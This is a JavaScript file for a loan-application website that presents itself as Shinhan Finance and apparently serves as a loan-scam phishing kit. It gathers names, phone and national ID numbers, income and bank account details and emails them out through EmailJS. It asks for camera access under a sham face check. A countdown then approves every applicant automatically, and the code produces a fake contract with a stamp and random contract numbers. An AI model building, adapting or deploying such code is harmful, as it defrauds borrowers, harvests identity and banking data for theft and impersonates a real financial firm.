// Initialize EmailJS
(function() {
    emailjs.init("c-Ms5MjWbitpDBb-E"); // Replace with your EmailJS public key
})();

// Bank list with logos
const banks = [
    { name: "Agribank", logo: "assets/images/banks/agribank.png" },
    { name: "Vietcombank", logo: "assets/images/banks/vietcombank.png" },
    { name: "VietinBank", logo: "assets/images/banks/vietinbank.png" },
    { name: "BIDV", logo: "assets/images/banks/bidv.png" },
    { name: "MB Bank", logo: "assets/images/banks/mbbank.png" },
    { name: "Techcombank", logo: "assets/images/banks/techcombank.png" },
    { name: "VPBank", logo: "assets/images/banks/vpbank.png" },
    { name: "Sacombank", logo: "assets/images/banks/sacombank.png" },
    { name: "ACB", logo: "assets/images/banks/acb.png" },
    { name: "Shinhan Bank", logo: "assets/images/banks/shinhan.png" },
    { name: "TPBank", logo: "assets/images/banks/tpbank.png" },
    { name: "VIB", logo: "assets/images/banks/vib.png" },
    { name: "HDBank", logo: "assets/images/banks/hdbank.png" },
    { name: "Vietnam Bank for Social Policies", logo: "assets/images/banks/vbsp.png" },
    { name: "Vietnam Development Bank", logo: "assets/images/banks/vdb.png" },
    { name: "Vietnam Construction Bank", logo: "https://via.placeholder.com/20?text=VCBank" },
    { name: "Ocean Bank", logo: "assets/images/banks/oceanbank.png" },
    { name: "Global Petro Bank", logo: "https://via.placeholder.com/20?text=GPBank" },
    { name: "SHB", logo: "assets/images/banks/shb.png" },
    { name: "LPBank", logo: "https://via.placeholder.com/20?text=LPBank" },
    { name: "SeABank", logo: "assets/images/banks/seabank.png" },
    { name: "OCB", logo: "assets/images/banks/ocb.png" },
    { name: "SCB", logo: "assets/images/banks/scb.png" },
    { name: "MSB", logo: "assets/images/banks/msb.png" },
    { name: "Nam A Bank", logo: "assets/images/banks/namabank.png" },
    { name: "PVCombank", logo: "assets/images/banks/pvcombank.png" },
    { name: "ABBank", logo: "assets/images/banks/abbank.png" },
    { name: "Viet A Bank", logo: "assets/images/banks/vietabank.png" },
    { name: "Kienlongbank", logo: "assets/images/banks/kienlongbank.png" },
    { name: "Indovina Bank", logo: "https://via.placeholder.com/20?text=Indovina" }
];

// Global state
let formData = {
    fullName: "", phone: "", job: "", idNumber: "", currentJob: "",
    monthlyIncome: "", loanAmount: "", loanTerm: "", bankAccount: "",
    bankName: "", loanType: "", interestRate: "", monthlyPayment: ""
};
let faceDetected = false;
let countdown = 60;
let isApproved = false;

// Sanitize input
const sanitizeInput = (input) => {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
};

// Validate form
const validateForm = (data) => {
    const errors = {};
    const phoneRegex = /^[0-9]{10}$/;
    const idRegex = /^[0-9]{9,12}$/;
    const bankAccountRegex = /^[0-9]{8,20}$/;

    if (!data.fullName) errors.fullName = 'Họ và tên là bắt buộc';
    if (!phoneRegex.test(data.phone)) errors.phone = 'Số điện thoại phải có 10 chữ số';
    if (!data.job) errors.job = 'Công việc là bắt buộc';
    if (!idRegex.test(data.idNumber)) errors.idNumber = 'CCCD/CMND phải có 9-12 chữ số';
    if (!data.currentJob) errors.currentJob = 'Công việc hiện tại là bắt buộc';
    if (data.monthlyIncome <= 0) errors.monthlyIncome = 'Thu nhập phải lớn hơn 0';
    if (data.loanAmount < 1000000) errors.loanAmount = 'Số tiền vay tối thiểu 1,000,000 VNĐ';
    if (data.loanTerm < 6 || data.loanTerm > 60) errors.loanTerm = 'Thời hạn vay từ 6-60 tháng';
    if (!bankAccountRegex.test(data.bankAccount)) errors.bankAccount = 'Số tài khoản phải có 8-20 chữ số';
    if (!data.bankName) errors.bankName = 'Vui lòng chọn ngân hàng';
    if (!data.loanType) errors.loanType = 'Vui lòng chọn loại vay';

    return errors;
};

// Calculate interest (updated with Shinhan Finance rates)
const calculateInterest = (amount, term, type) => {
    let rate;
    switch (type) {
        case "Vay tiêu dùng": rate = 18; break; // Shinhan Finance personal loan
        case "Vay mua xe": rate = 5.89; break; // Shinhan Finance auto loan
        default: rate = 18;
    }
    const monthlyRate = rate / 100 / 12;
    const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, term)) / (Math.pow(1 + monthlyRate, term) - 1);
    return { rate, monthlyPayment: monthlyPayment.toFixed(2) };
};

// Generate PDF
const downloadPDF = () => {
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();
    const logoUrl = "assets/images/logo.png";

    doc.addImage(logoUrl, "PNG", 10, 10, 50, 20);
    doc.setFontSize(12);
    doc.text("Shinhan Finance", 70, 20);
    doc.text(`Số tham chiếu: ARN-${Math.random().toString(36).substr(2, 9)}`, 10, 40);
    doc.text(`Số hợp đồng: LA-${Math.random().toString(36).substr(2, 9)}`, 10, 50);
    doc.text(`Ngày: ${new Date().toLocaleDateString()}`, 10, 60);
    doc.text(`Họ và tên: ${formData.fullName}`, 10, 80);
    doc.text(`Số tiền vay: ${formData.loanAmount.toLocaleString('vi-VN')} VNĐ`, 10, 90);
    doc.text(`Loại vay: ${formData.loanType}`, 10, 100);
    doc.text(`Thời hạn vay: ${formData.loanTerm} tháng`, 10, 110);
    doc.text(`Lãi suất: ${formData.interestRate}%/năm`, 10, 120);
    doc.text(`Số tiền trả hàng tháng: ${formData.monthlyPayment} VNĐ`, 10, 130);

    doc.addPage();
    doc.addImage(logoUrl, "PNG", 10, 10, 50, 20);
    doc.text("Điều khoản và điều kiện chung", 10, 40);
    doc.text("1. Bên vay đồng ý với các điều khoản của hợp đồng.", 10, 50);
    doc.text("2. Không yêu cầu mua bảo hiểm khoản vay.", 10, 60);

    doc.addPage();
    doc.addImage(logoUrl, "PNG", 10, 10, 50, 20);
    doc.text("Liên hệ", 10, 40);
    doc.text("Hotline: (84-28) 39 113 666", 10, 50);
    doc.text("Địa chỉ: Tầng 17, Tòa nhà Geleximco, Quận Đống Đa, Hà Nội", 10, 60);

    doc.save("Ho_so_vay.pdf");
};

// Show home
function showHome() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('home-content').classList.remove('hidden');
    document.getElementById('home-content').scrollIntoView({ behavior: 'smooth' });
    document.querySelector('.menu-items').classList.remove('active');
}

// Show register form
function showRegisterForm() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('register-form').classList.remove('hidden');
    document.getElementById('register-form').scrollIntoView({ behavior: 'smooth' });
    document.querySelector('.menu-items').classList.remove('active');
}

// Show face verification
function showFaceVerification() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('face-verification').classList.remove('hidden');
    document.getElementById('face-verification').scrollIntoView({ behavior: 'smooth' });
    document.querySelector('.menu-items').classList.remove('active');
}

// Show review info
function showReviewInfo() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('review-info').classList.remove('hidden');
    document.getElementById('review-info').scrollIntoView({ behavior: 'smooth' });
    document.querySelector('.menu-items').classList.remove('active');
}

// Show loan result
function showLoanResult() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('loan-result').classList.remove('hidden');
    document.getElementById('loan-result').scrollIntoView({ behavior: 'smooth' });
    document.querySelector('.menu-items').classList.remove('active');
}

// Show loan calculator modal
function showLoanCalculator() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('loan-calculator-modal').classList.remove('hidden');
    document.getElementById('loan-calculator-modal').scrollIntoView({ behavior: 'smooth' });
    document.querySelector('.menu-items').classList.remove('active');
}

// Close loan calculator modal
function closeLoanCalculator() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('home-content').classList.remove('hidden');
    document.querySelector('.menu-items').classList.remove('active');
}

// Show loan approval
function showLoanApproval() {
    const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
    sections.forEach(section => section.classList.add('hidden'));
    document.getElementById('loan-approval').classList.remove('hidden');
    document.getElementById('loan-approval').scrollIntoView({ behavior: 'smooth' });
    document.querySelector('.menu-items').classList.remove('active');
}

// Generate contract image
function generateContractImage() {
    const canvas = document.createElement('canvas');
    canvas.width = 340;
    canvas.height = 510;
    const ctx = canvas.getContext('2d');

    ctx.fillStyle = '#ffffff';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = '#004080';
    ctx.font = 'bold 16px Roboto';
    ctx.textAlign = 'center';
    ctx.fillText('HỢP ĐỒNG VAY', canvas.width / 2, 34);

    ctx.font = '10px Roboto';
    ctx.textAlign = 'left';
    ctx.fillText(`Khách hàng: ${formData.fullName}`, 26, 68);
    ctx.fillText(`Số điện thoại: ${formData.phone}`, 26, 84);
    ctx.fillText(`Công việc: ${formData.job}`, 26, 100);
    ctx.fillText(`CCCD/CMND: ${formData.idNumber}`, 26, 116);
    ctx.fillText(`Công việc hiện tại: ${formData.currentJob}`, 26, 132);
    ctx.fillText(`Thu nhập: ${formData.monthlyIncome.toLocaleString('vi-VN')} VNĐ`, 26, 148);
    ctx.fillText(`Số tiền vay: ${formData.loanAmount.toLocaleString('vi-VN')} VNĐ`, 26, 164);
    ctx.fillText(`Thời hạn vay: ${formData.loanTerm} tháng`, 26, 180);
    ctx.fillText(`Ngân hàng: ${formData.bankName}`, 26, 196);
    ctx.fillText(`Loại vay: ${formData.loanType}`, 26, 212);
    ctx.fillText(`Lãi suất: ${formData.interestRate}%/năm`, 26, 228);
    ctx.fillText(`Thanh toán hàng tháng: ${formData.monthlyPayment} VNĐ`, 26, 244);

    const stamp = new Image();
    stamp.src = 'assets/images/stamp.png';
    stamp.onload = () => {
        ctx.drawImage(stamp, 260, 430, 68, 68);
    };

    return canvas.toDataURL('image/png');
}

// Agree and proceed
function agreeAndProceed() {
    const contractImage = generateContractImage();
    document.getElementById('contract-display').src = contractImage;
    document.getElementById('approval-details').innerHTML = `
        <p><strong>Khách hàng:</strong> ${formData.fullName}</p>
        <p><strong>Số điện thoại:</strong> ${formData.phone}</p>
        <p><strong>Công việc:</strong> ${formData.job}</p>
        <p><strong>CCCD/CMND:</strong> ${formData.idNumber}</p>
        <p><strong>Công việc hiện tại:</strong> ${formData.currentJob}</p>
        <p><strong>Thu nhập hàng tháng:</strong> ${formData.monthlyIncome.toLocaleString('vi-VN')} VNĐ</p>
        <p><strong>Số tiền vay:</strong> ${formData.loanAmount.toLocaleString('vi-VN')} VNĐ</p>
        <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
        <p><strong>Số tài khoản:</strong> ${formData.bankAccount}</p>
        <p><strong>Ngân hàng:</strong> ${formData.bankName}</p>
        <p><strong>Loại vay:</strong> ${formData.loanType}</p>
        <p><strong>Mức góp hàng tháng:</strong> ${formData.monthlyPayment} VNĐ</p>
    `;
    showLoanApproval();
}

// Start countdown
function startCountdown() {
    countdown = 60;
    isApproved = false;
    document.getElementById('countdown').textContent = countdown;
    document.getElementById('result-message').classList.remove('hidden');
    document.getElementById('approved-message').classList.add('hidden');

    const timer = setInterval(() => {
        countdown--;
        document.getElementById('countdown').textContent = countdown;
        if (countdown <= 0) {
            clearInterval(timer);
            isApproved = true;
            document.getElementById('result-message').classList.add('hidden');
            document.getElementById('approved-message').classList.remove('hidden');
            document.getElementById('approved-loanAmount').textContent = formData.loanAmount.toLocaleString('vi-VN');
        }
    }, 1000);
}

// DOM Content Loaded
document.addEventListener('DOMContentLoaded', () => {
    // Initialize Select2 for bank dropdown
    $('#bankName').select2({
        data: banks.map(bank => ({
            id: bank.name,
            text: bank.name,
            logo: bank.logo
        })),
        templateResult: formatBank,
        templateSelection: formatBank,
        placeholder: 'Chọn ngân hàng',
        allowClear: true
    });

    function formatBank(bank) {
        if (!bank.id) return bank.text;
        return $(`
            <div style="display: flex; align-items: center;">
                <img src="${bank.logo}" style="width: 20px; height: 20px; margin-right: 10px;" alt="${bank.text}" onerror="this.src='https://via.placeholder.com/20?text=Bank'"/>
                ${bank.text}
            </div>
        `);
    }

    // Menu toggle
    const hamburger = document.querySelector('.hamburger');
    const menuItems = document.querySelector('.menu-items');
    if (hamburger) {
        hamburger.addEventListener('click', (e) => {
            e.stopPropagation();
            menuItems.classList.toggle('active');
        });
    }

    // Close menu when clicking outside
    document.addEventListener('click', (e) => {
        if (!e.target.closest('.hamburger') && !e.target.closest('.menu-items')) {
            menuItems.classList.remove('active');
        }
    });

    // Prevent logo click from toggling menu
    const logoLink = document.querySelector('header a[href="/"]');
    if (logoLink) {
        logoLink.addEventListener('click', (e) => {
            e.preventDefault();
            const sections = document.querySelectorAll('.content-section, #register-form, #face-verification, #review-info, #loan-result, #loan-calculator-modal, #loan-approval');
            sections.forEach(section => section.classList.add('hidden'));
            document.getElementById('home-content').classList.remove('hidden');
            menuItems.classList.remove('active');
        });
    }

    // Menu navigation
    const menuLinks = document.querySelectorAll('.menu-link');
    const sections = document.querySelectorAll('.content-section');
    menuLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const targetId = link.getAttribute('data-target');
            sections.forEach(section => section.classList.add('hidden'));
            const targetSection = document.getElementById(targetId);
            if (targetSection) {
                targetSection.classList.remove('hidden');
                targetSection.scrollIntoView({ behavior: 'smooth' });
            }
            document.getElementById('register-form').classList.add('hidden');
            document.getElementById('face-verification').classList.add('hidden');
            document.getElementById('review-info').classList.add('hidden');
            document.getElementById('loan-result').classList.add('hidden');
            document.getElementById('loan-calculator-modal').classList.add('hidden');
            document.getElementById('loan-approval').classList.add('hidden');
            menuItems.classList.remove('active');
        });
    });

    // Partner logos click
    const partnerLogos = document.querySelectorAll('.partner-logo');
    partnerLogos.forEach(logo => {
        logo.addEventListener('click', () => {
            const partner = logo.getAttribute('data-partner');
            const details = document.getElementById('partner-details');
            const allDetails = document.querySelectorAll('#partner-details p');
            allDetails.forEach(detail => detail.classList.add('hidden'));
            document.getElementById(`${partner}-detail`).classList.remove('hidden');
            details.classList.add('active');
        });
    });

    // Award cards click
    const awardCards = document.querySelectorAll('.award-card');
    awardCards.forEach(card => {
        card.addEventListener('click', () => {
            const award = card.getAttribute('data-award');
            const details = document.getElementById(`${award}-details`);
            const allDetails = document.querySelectorAll('.award-details');
            allDetails.forEach(detail => detail.classList.remove('active'));
            details.classList.toggle('active');
        });
    });

    // Loan Form handling
    const loanForm = document.getElementById('loanForm');
    const submitButton = loanForm.querySelector('button[type="submit"]');
    const inputs = loanForm.querySelectorAll('input, select');
    const notification = document.getElementById('register-notification');

    inputs.forEach(input => {
        input.addEventListener('input', () => {
            const allFilled = Array.from(inputs).every(i => i.value || (i.tagName === 'SELECT' && i.selectedIndex > 0));
            submitButton.disabled = !allFilled;
        });
    });

    loanForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        notification.classList.remove('error', 'success');
        notification.textContent = '';
        submitButton.disabled = true;
        document.getElementById('form-spinner').classList.remove('hidden');

        formData = {
            fullName: sanitizeInput(document.getElementById('fullName').value),
            phone: document.getElementById('phone').value,
            job: sanitizeInput(document.getElementById('job').value),
            idNumber: document.getElementById('idNumber').value,
            currentJob: sanitizeInput(document.getElementById('currentJob').value),
            monthlyIncome: parseFloat(document.getElementById('monthlyIncome').value),
            loanAmount: parseFloat(document.getElementById('loanAmount').value),
            loanTerm: parseInt(document.getElementById('loanTerm').value),
            bankAccount: document.getElementById('bankAccount').value,
            bankName: document.getElementById('bankName').value,
            loanType: document.getElementById('loanType').value
        };

        const errors = validateForm(formData);
        Object.keys(errors).forEach(key => {
            document.getElementById(`${key}-error`).textContent = errors[key];
        });

        if (Object.keys(errors).length > 0) {
            notification.classList.add('error');
            notification.textContent = 'Vui lòng kiểm tra lại thông tin.';
            submitButton.disabled = false;
            document.getElementById('form-spinner').classList.add('hidden');
            return;
        }

        const { rate, monthlyPayment } = calculateInterest(formData.loanAmount, formData.loanTerm, formData.loanType);
        formData.interestRate = rate;
        formData.monthlyPayment = monthlyPayment;
        document.getElementById('interestRate').textContent = rate;
        document.getElementById('monthlyPayment').textContent = monthlyPayment;
        document.getElementById('interestResult').classList.remove('hidden');

        try {
            await emailjs.send('service_ytsr91e', 'template_3a7yorj', {
                fullName: formData.fullName,
                phone: formData.phone,
                job: formData.job,
                idNumber: formData.idNumber,
                currentJob: formData.currentJob,
                monthlyIncome: formData.monthlyIncome.toLocaleString('vi-VN'),
                loanAmount: formData.loanAmount.toLocaleString('vi-VN'),
                loanTerm: formData.loanTerm,
                bankAccount: formData.bankAccount,
                bankName: formData.bankName,
                loanType: formData.loanType,
                monthlyPayment: formData.monthlyPayment
            });
            notification.classList.add('success');
            notification.textContent = 'Thông tin đã được gửi, chuyển sang xác minh khuôn mặt.';
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(() => {
                    setTimeout(showFaceVerification, 1000);
                })
                .catch(error => {
                    console.error('Camera permission error:', error);
                    notification.classList.add('error');
                    notification.textContent = 'Vui lòng cho phép truy cập camera để tiếp tục.';
                });
        } catch (error) {
            console.error('EmailJS error:', error);
            notification.classList.add('error');
            notification.textContent = 'Lỗi khi gửi thông tin. Vui lòng kiểm tra kết nối hoặc thử lại.';
        } finally {
            submitButton.disabled = false;
            document.getElementById('form-spinner').classList.add('hidden');
        }
    });

    // Face verification
    document.getElementById('face-verification').addEventListener('mouseenter', () => {
        Promise.all([
            faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models')
        ]).then(() => {
            const video = document.createElement("video");
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;
                    video.play();
                    const detectFace = async () => {
                        const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
                        faceDetected = detections.length > 0;
                        const circle = document.getElementById('face-circle');
                        const message = document.getElementById('face-message');
                        circle.className = `w-48 h-48 rounded-full mx-auto my-5 ${faceDetected ? 'green' : 'red'}`;
                        message.textContent = faceDetected ? 'Khuôn mặt được phát hiện, giữ trong 8 giây' : 'Vui lòng đặt khuôn mặt vào khung tròn';
                        if (faceDetected) {
                            setTimeout(() => {
                                showReviewInfo();
                                document.getElementById('review-fullName').textContent = formData.fullName;
                                document.getElementById('review-phone').textContent = formData.phone;
                                document.getElementById('review-job').textContent = formData.job;
                                document.getElementById('review-idNumber').textContent = formData.idNumber;
                                document.getElementById('review-currentJob').textContent = formData.currentJob;
                                document.getElementById('review-monthlyIncome').textContent = formData.monthlyIncome.toLocaleString('vi-VN');
                                document.getElementById('review-loanAmount').textContent = formData.loanAmount.toLocaleString('vi-VN');
                                document.getElementById('review-loanTerm').textContent = formData.loanTerm;
                                document.getElementById('review-bankAccount').textContent = formData.bankAccount;
                                document.getElementById('review-bankName').textContent = formData.bankName;
                                document.getElementById('review-loanType').textContent = formData.loanType;
                                document.getElementById('review-interestRate').textContent = formData.interestRate;
                                document.getElementById('review-monthlyPayment').textContent = formData.monthlyPayment;
                                video.srcObject.getTracks().forEach(track => track.stop());
                            }, 8000);
                        }
                        requestAnimationFrame(detectFace);
                    };
                    detectFace();
                })
                .catch((error) => {
                    console.error('Camera access error:', error);
                    document.getElementById('face-notification').classList.add('error');
                    document.getElementById('face-notification').textContent = 'Không thể truy cập camera. Vui lòng kiểm tra quyền truy cập.';
                });
        }).catch(error => {
            console.error('Face API load error:', error);
            document.getElementById('face-notification').classList.add('error');
            document.getElementById('face-notification').textContent = 'Lỗi tải mô hình nhận diện. Vui lòng kiểm tra kết nối.';
        });
    });

    // Loan Calculator Form handling
    const calculatorForm = document.getElementById('calculatorForm');
    const calcNotification = document.getElementById('calculator-notification');
    if (calculatorForm) {
        calculatorForm.addEventListener('submit', (e) => {
            e.preventDefault();
            calcNotification.classList.remove('error', 'success');
            calcNotification.textContent = '';

            const calcData = {
                loanAmount: parseFloat(document.getElementById('calcLoanAmount').value),
                loanTerm: parseInt(document.getElementById('calcLoanTerm').value),
                loanType: document.getElementById('calcLoanType').value
            };

            const errors = {};
            if (calcData.loanAmount < 1000000 || isNaN(calcData.loanAmount)) errors.calcLoanAmount = 'Số tiền vay tối thiểu 1,000,000 VNĐ và phải hợp lệ';
            if (calcData.loanTerm < 6 || calcData.loanTerm > 60 || isNaN(calcData.loanTerm)) errors.calcLoanTerm = 'Thời hạn vay từ 6-60 tháng và phải hợp lệ';
            if (!calcData.loanType) errors.calcLoanType = 'Vui lòng chọn loại vay';

            Object.keys(errors).forEach(key => {
                document.getElementById(`${key}-error`).textContent = errors[key];
            });

            if (Object.keys(errors).length > 0) {
                calcNotification.classList.add('error');
                calcNotification.textContent = 'Vui lòng kiểm tra lại thông tin.';
                return;
            }

            const { rate, monthlyPayment } = calculateInterest(calcData.loanAmount, calcData.loanTerm, calcData.loanType);
            document.getElementById('calcInterestRate').textContent = rate;
            document.getElementById('calcMonthlyPayment').textContent = monthlyPayment;
            document.getElementById('calcResult').style.display = 'block';
            calcNotification.classList.add('success');
            calcNotification.textContent = 'Kết quả tính khoản vay đã được hiển thị!';
        });
    }

    // Contact Form handling
    const contactForm = document.getElementById('contactForm');
    if (contactForm) {
        contactForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const notification = document.getElementById('contact-notification');
            notification.classList.remove('error', 'success');
            notification.textContent = '';

            const contactData = {
                name: sanitizeInput(document.getElementById('contactName').value),
                email: document.getElementById('contactEmail').value,
                message: sanitizeInput(document.getElementById('contactMessage').value)
            };

            const errors = {};
            if (!contactData.name) errors.contactName = 'Họ và tên là bắt buộc';
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(contactData.email)) errors.contactEmail = 'Email không hợp lệ';
            if (!contactData.message) errors.contactMessage = 'Tin nhắn là bắt buộc';

            Object.keys(errors).forEach(key => {
                document.getElementById(`${key}-error`).textContent = errors[key];
            });

            if (Object.keys(errors).length > 0) {
                notification.classList.add('error');
                notification.textContent = 'Vui lòng kiểm tra lại thông tin.';
                return;
            }

            try {
                await emailjs.send('service_ytsr91e', 'template_contact', {
                    name: contactData.name,
                    email: contactData.email,
                    message: contactData.message
                });
                notification.classList.add('success');
                notification.textContent = 'Tin nhắn đã được gửi thành công!';
                contactForm.reset();
            } catch (error) {
                console.error('Failed to send contact email:', error);
                notification.classList.add('error');
                notification.textContent = 'Lỗi khi gửi tin nhắn. Vui lòng kiểm tra kết nối hoặc thử lại.';
            }
        });
    }

    // Slider
    const sliderContainer = document.querySelector('.testimonials .slider-container');
    const prevButton = document.querySelector('[data-slider-prev]');
    const nextButton = document.querySelector('[data-slider-next]');
    let currentIndex = 0;
    const totalSlides = document.querySelectorAll('.testimonials .slider-item').length;

    const updateSlider = () => {
        if (sliderContainer) {
            sliderContainer.style.transform = `translateX(-${currentIndex * 100}%)`;
        }
    };

    if (prevButton) {
        prevButton.addEventListener('click', () => {
            currentIndex = currentIndex > 0 ? currentIndex - 1 : totalSlides - 1;
            updateSlider();
        });
    }

    if (nextButton) {
        nextButton.addEventListener('click', () => {
            currentIndex = currentIndex < totalSlides - 1 ? currentIndex + 1 : 0;
            updateSlider();
        });
    }

    setInterval(() => {
        currentIndex = currentIndex < totalSlides - 1 ? currentIndex + 1 : 0;
        updateSlider();
    }, 5000);

    // Promo Slider
    const promoSliderContainer = document.querySelector('.promo-slider-container');
    const promoPrevButton = document.querySelector('[data-promo-slider-prev]');
    const promoNextButton = document.querySelector('[data-promo-slider-next]');
    let promoCurrentIndex = 0;
    const totalPromoSlides = document.querySelectorAll('.promo-slider-item').length;

    const updatePromoSlider = () => {
        if (promoSliderContainer) {
            promoSliderContainer.style.transform = `translateX(-${promoCurrentIndex * 100}%)`;
        }
    };

    if (promoPrevButton) {
        promoPrevButton.addEventListener('click', () => {
            promoCurrentIndex = promoCurrentIndex > 0 ? promoCurrentIndex - 1 : totalPromoSlides - 1;
            updatePromoSlider();
        });
    }

    if (promoNextButton) {
        promoNextButton.addEventListener('click', () => {
            promoCurrentIndex = promoCurrentIndex < totalPromoSlides - 1 ? promoCurrentIndex + 1 : 0;
            updatePromoSlider();
        });
    }

    setInterval(() => {
        promoCurrentIndex = promoCurrentIndex < totalPromoSlides - 1 ? promoCurrentIndex + 1 : 0;
        updatePromoSlider();
    }, 5000);
});